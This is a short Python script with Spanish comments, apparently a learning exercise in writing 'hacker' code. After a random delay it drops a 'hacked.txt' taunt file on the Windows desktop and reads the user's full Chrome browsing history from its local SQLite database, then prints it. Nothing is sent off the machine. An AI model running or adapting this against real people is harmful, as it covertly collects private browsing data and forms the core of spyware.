import os
from time import sleep
from random import randrange
import sqlite3


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    # sleep(n_hours * 60 * 60)  # Sleep hace un conteo de los segundos que le pongas, en este caso horas
    sleep(n_hours)


def create_hacker_file(desktop_path):
    with open(desktop_path + "hacked.txt", "w") as hacker_file:
        hacker_file.write("Has sido hackeado/a")
        hacker_file.close()
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()  # Permite comunicarse con SQL
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")  # Mira los campos
            urls = cursor.fetchall()  # Recoge todos los resultados de la consulta
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)


def main():

    delay_action()
    user_path = "C:\\Users\\" + os.getlogin()  # permite obtener el usuario activo
    desktop_path = user_path + "\\Desktop\\"
    create_hacker_file(desktop_path)

    print(get_chrome_history(user_path))


if __name__ == "__main__":
    main()
